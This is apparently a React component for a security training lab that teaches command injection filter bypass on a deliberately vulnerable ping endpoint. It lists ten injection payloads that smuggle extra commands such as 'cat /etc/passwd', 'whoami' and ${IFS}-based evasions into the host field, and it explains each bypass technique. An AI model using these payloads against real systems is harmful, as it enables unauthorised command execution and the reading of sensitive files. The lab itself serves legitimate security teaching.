import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Textarea } from '@/components/ui/textarea';

export default function CmdiFilterBypassLab() {
  const [hostInput, setHostInput] = useState('127.0.0.1');
  const [result, setResult] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [baseUrl, setBaseUrl] = useState('');

  useEffect(() => {
    const url = window.location.origin;
    setBaseUrl(url);
  }, []);

  const handlePingCommand = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    
    try {
      const response = await fetch(`${baseUrl}/api/vuln/command`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ host: hostInput })
      });
      
      if (!response.ok) {
        throw new Error(`Error: ${response.status} ${response.statusText}`);
      }
      
      const data = await response.json();
      setResult(data);
      
    } catch (err) {
      setError(err instanceof Error ? err.message : 'An unknown error occurred');
    } finally {
      setLoading(false);
    }
  };

  const renderBypassPayloads = () => {
    const payloads = [
      "127.0.0.1; cat /etc/passwd",
      "127.0.0.1 && whoami",
      "127.0.0.1 || id",
      "127.0.0.1 | cat /etc/hosts",
      "127.0.0.1; echo $PATH",
      "127.0.0.1`whoami`",
      "127.0.0.1$(cat /etc/passwd)",
      "127.0.0.1%0Acat%20/etc/passwd",
      "127.0.0.1;echo$IFS'injected'",
      "127.0.0.1${IFS}&&${IFS}cat${IFS}/etc/passwd"
    ];

    return payloads.map((payload, index) => (
      <div key={index} className="flex items-center justify-between p-2 bg-[#0A0A14] rounded border border-gray-800">
        <code className="text-xs text-[#00FECA] flex-1 mr-2">{payload}</code>
        <Button 
          size="sm" 
          variant="outline"
          onClick={() => setHostInput(payload)}
          className="text-xs border-[#00FECA]/30 text-[#00FECA] hover:bg-[#00FECA]/10"
        >
          Use
        </Button>
      </div>
    ));
  };

  return (
    <div className="cyber-card border border-gray-800 mb-6">
      <div className="bg-gradient-to-r from-[#0A0A14] to-[#0D0D14] border-b border-gray-800 px-6 py-5">
        <h2 className="text-xl font-bold flex items-center">
          <span className="cyber-gradient-text">Command Injection Filter Bypass</span>
          <Badge className="ml-3 bg-[#B14EFF]/20 text-[#B14EFF] border-[#B14EFF]/30">Intermediate</Badge>
        </h2>
        <p className="text-gray-400 mt-1">Bypass input filters to achieve remote code execution</p>
      </div>
      
      <div className="p-6 space-y-6">
        <Alert className="bg-[#B14EFF]/10 border-[#B14EFF]/30">
          <AlertTitle className="text-[#B14EFF]">Challenge Objective</AlertTitle>
          <AlertDescription>
            This ping utility has input validation that blocks common command injection attempts. 
            Use advanced bypass techniques to execute additional commands on the server.
          </AlertDescription>
        </Alert>

        <Card className="bg-[#0D0D14] border-gray-800">
          <CardHeader>
            <CardTitle className="text-sm flex items-center">
              <span className="material-icons mr-2 text-[#00FECA] text-sm">network_ping</span>
              Network Ping Utility (Filtered)
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <form onSubmit={handlePingCommand} className="space-y-4">
              <div className="flex gap-2">
                <Input 
                  value={hostInput}
                  onChange={(e) => setHostInput(e.target.value)}
                  placeholder="Enter IP address or command injection payload..."
                  className="flex-1 bg-[#0A0A14] border-gray-800 focus:ring-[#00FECA]"
                />
                <Button type="submit" disabled={loading} className="cyber-button">
                  {loading ? 'Pinging...' : 'Ping'}
                </Button>
              </div>
              
              <div className="p-4 bg-[#0D0D14] rounded-md border border-gray-800">
                <h4 className="font-medium mb-2 flex items-center">
                  <span className="material-icons mr-2 text-[#FF3E8F] text-sm">code</span>
                  Executed Command:
                </h4>
                <pre className="text-xs bg-[#0A0A14] p-3 rounded border border-gray-800 overflow-x-auto">
                  <code className="text-[#00FECA]">ping -c 4 {hostInput}</code>
                </pre>
              </div>
              
              {result && (
                <div className="mt-4">
                  <h4 className="font-medium mb-2 flex items-center">
                    <span className="material-icons mr-2 text-[#B14EFF] text-sm">terminal</span>
                    Command Output:
                  </h4>
                  <div className="bg-[#0D0D14] rounded-md border border-gray-800 p-4">
                    <Textarea
                      value={result.output || result.message || 'No output available'}
                      readOnly
                      className="min-h-[200px] bg-[#0A0A14] border-gray-800 font-mono text-xs text-gray-300"
                    />
                    
                    {result.injection_detected && (
                      <Alert className="mt-3 bg-[#00FECA]/10 border-[#00FECA]/30">
                        <AlertTitle className="text-[#00FECA] flex items-center">
                          <span className="material-icons mr-2 text-sm">check_circle</span>
                          Command Injection Successful!
                        </AlertTitle>
                        <AlertDescription>
                          <p>Your payload successfully bypassed the input filters and executed additional commands.</p>
                          {result.commands_executed && (
                            <div className="mt-2">
                              <p className="text-sm">Commands executed:</p>
                              <ul className="list-disc ml-4 text-xs">
                                {result.commands_executed.map((cmd: string, index: number) => (
                                  <li key={index} className="text-[#00FECA]">{cmd}</li>
                                ))}
                              </ul>
                            </div>
                          )}
                        </AlertDescription>
                      </Alert>
                    )}

                    {result.filter_triggered && (
                      <Alert className="mt-3 bg-[#FF3E8F]/10 border-[#FF3E8F]/30">
                        <AlertTitle className="text-[#FF3E8F]">Filter Triggered</AlertTitle>
                        <AlertDescription>
                          Input validation detected and blocked your injection attempt. Try different bypass techniques.
                        </AlertDescription>
                      </Alert>
                    )}
                  </div>
                </div>
              )}
              
              {error && (
                <Alert variant="destructive" className="bg-[#FF3E8F]/10 border-[#FF3E8F]/30">
                  <AlertTitle className="text-[#FF3E8F]">Error</AlertTitle>
                  <AlertDescription>{error}</AlertDescription>
                </Alert>
              )}
            </form>
          </CardContent>
        </Card>

        <Card className="bg-[#0D0D14] border-gray-800">
          <CardHeader>
            <CardTitle className="text-sm flex items-center">
              <span className="material-icons mr-2 text-[#B14EFF] text-sm">shield</span>
              Filter Bypass Techniques
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-2">
            {renderBypassPayloads()}
          </CardContent>
        </Card>

        <Alert variant="outline" className="mt-4 border-[#B14EFF]/30 bg-[#B14EFF]/5">
          <AlertTitle className="text-[#B14EFF]">Command Injection Bypass Methods</AlertTitle>
          <AlertDescription>
            <ul className="list-disc mt-2 ml-6 space-y-1 text-gray-300 text-sm">
              <li><span className="font-medium text-[#00FECA]">Command Separators:</span> ; && || | for chaining commands</li>
              <li><span className="font-medium text-[#00FECA]">Command Substitution:</span> `command` or $(command) for execution</li>
              <li><span className="font-medium text-[#00FECA]">URL Encoding:</span> %0A %0D for newline injection</li>
              <li><span className="font-medium text-[#00FECA]">Variable Expansion:</span> $IFS ${IFS} for space bypasses</li>
              <li><span className="font-medium text-[#00FECA]">Concatenation:</span> echo$IFS'text' for filter evasion</li>
            </ul>
          </AlertDescription>
        </Alert>
      </div>
    </div>
  );
}